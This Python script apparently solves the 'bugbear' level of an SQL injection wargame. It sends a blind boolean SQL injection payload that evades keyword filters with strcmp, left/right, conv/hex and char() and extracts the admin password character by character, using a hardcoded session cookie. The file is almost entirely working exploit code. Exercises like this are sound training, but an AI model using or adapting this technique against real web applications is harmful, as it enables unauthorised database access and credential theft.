import requests
import string
string.printable

url = "https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php"
cookies = {
    'PHPSESSID' : 'nui79padnqo9dshj9fl9m5ani3'
}
params = {
    'no' : None
}


answer = ''
for i in range(1,9):
    for j in string.printable:
        payload = "123||(not(strcmp(left(id,4),char(1633971561)))&&not(strcmp(conv(hex(right(left(pw,{}),1)),16,10),{})))#".format(i,ord(j))
        params['no'] = payload
        response = requests.get(url,params=params,cookies=cookies)
        if("Hello admin" in response.text):
            answer +=j
            print(payload)
            break

print(answer)